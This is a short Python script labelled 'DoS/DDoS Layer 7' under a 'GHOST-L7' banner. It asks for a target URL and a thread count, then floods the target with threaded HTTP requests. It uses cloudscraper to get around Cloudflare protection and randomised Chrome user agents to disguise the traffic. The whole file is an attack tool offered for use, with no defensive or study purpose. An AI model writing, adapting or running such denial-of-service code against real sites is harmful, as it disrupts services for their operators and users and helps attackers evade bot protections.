import cloudscraper
import requests
import threading
from fake_useragent import UserAgent
import os

os.system("clear")
print("""
 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗   ██╗  ███████╗
██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝   ██║  ╚════██║
██║  ███╗███████║██║   ██║███████╗   ██║█████╗██║      ██╔╝
██║   ██║██╔══██║██║   ██║╚════██║   ██║╚════╝██║     ██╔╝
╚██████╔╝██║  ██║╚██████╔╝███████║   ██║      ███████╗██║
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝      ╚══════╝╚═╝
""")
print()
print("DoS/DDoS Layer 7")
print()

scraper = cloudscraper.create_scraper()
url = input("Target Url: ")
threads = int(input("Threads: "))

def attack(url):
    ua = UserAgent()
    headers = {"User-Agent": str(ua.chrome)}
    try:
        scraper.get(url, timeout=15, headers=headers)
        requests.get(url, timeout=15, headers=headers)
    except Exception as e:
        print("Error:", e)

def start_attack(url, threads):
    bots = []
    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(url,))
        thread.start()
        bots.append(thread)

    for bot in bots:
        bot.join()

if __name__ == "__main__":
    start_attack(url, threads)
